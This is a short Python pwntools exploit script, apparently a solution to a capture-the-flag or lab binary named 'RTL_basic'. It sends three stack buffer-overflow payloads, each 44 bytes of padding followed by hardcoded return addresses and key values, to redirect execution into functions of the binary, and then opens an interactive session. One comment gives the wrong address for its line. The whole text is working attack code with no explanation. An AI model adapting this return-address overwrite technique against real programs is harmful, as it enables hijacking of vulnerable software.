from pwn import *

ret_addr = p32(0x08048569)
ori_addr = p32(0x080485c4)
pro_addr = p32(0x0804862c)
ezy_addr = p32(0x0804852d)
key1 = p32(0xbadbeeef)
key2 = p32(0xabcdefff)
key3 = p32(0x78563412)

p = process("./RTL_basic")

#payload2 = " "

payload = "a"*44
payload += ret_addr    #0x08048569
payload += ezy_addr    #0x0804852d
payload += key1        #0xbadbeeef


p.send(payload) #call_ret

payload2 = "a"*44
payload2 += ori_addr    #0x08048569
payload2 += ezy_addr    #0x0804852d
payload2 += key2        #0xabcdefff
payload2 += key3        #0x78563412

pause()

p.send(payload2) #call_ori

payload3 = "a"*44
payload3 += pro_addr    

p.send(payload3) #call_pro



p.interactive()

